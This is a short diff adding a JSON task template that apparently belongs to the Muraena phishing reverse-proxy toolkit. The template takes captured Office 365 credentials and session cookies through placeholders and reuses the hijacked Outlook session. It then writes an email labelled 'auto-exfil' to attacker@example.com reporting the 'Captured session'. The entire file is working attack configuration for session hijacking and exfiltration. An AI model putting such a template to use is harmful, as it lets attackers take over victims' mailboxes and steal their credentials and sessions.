@@ -1,0 +1,17 @@
+{
+  "name": "%%%TRACKER%%%",
+  "task": {
+    "type": "office365",
+    "name": ["OutlookWriteEmail"],
+    "params": {
+      "fixSession": "https://outlook.office.com/mail/inbox",
+      "credentials": %%%CREDENTIALS%%%,
+      "writeEmail": {
+        "to": "attacker@example.com",
+        "subject": "Captured session - %%%TRACKER%%%",
+        "data": "Muraena auto-exfil"
+      }
+    }
+  },
+  "cookies": %%%COOKIES%%%
+}
